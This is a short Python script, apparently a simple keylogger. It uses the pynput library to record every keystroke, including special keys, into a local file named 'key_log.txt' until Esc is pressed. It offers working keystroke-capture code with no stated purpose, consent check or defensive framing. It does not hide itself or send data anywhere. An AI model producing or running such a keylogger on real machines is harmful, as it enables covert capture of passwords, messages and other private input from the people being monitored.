pip install pynput


import pynput
from pynput.keyboard import Key, Listener

# Specify the log file where keystrokes will be recorded
log_file = "key_log.txt"

# This function will be called whenever a key is pressed
def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(str(key.char))  # Write the character of the key pressed
    except AttributeError:
        with open(log_file, "a") as log:
            # Handle special keys like space, enter, etc.
            log.write(f"[{key}]")

# This function will be called whenever a key is released (optional, can be omitted)
def on_release(key):
    if key == Key.esc:
        # Stop listener on pressing 'esc'
        return False

# Set up the listener to monitor keyboard inputs
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start the listener
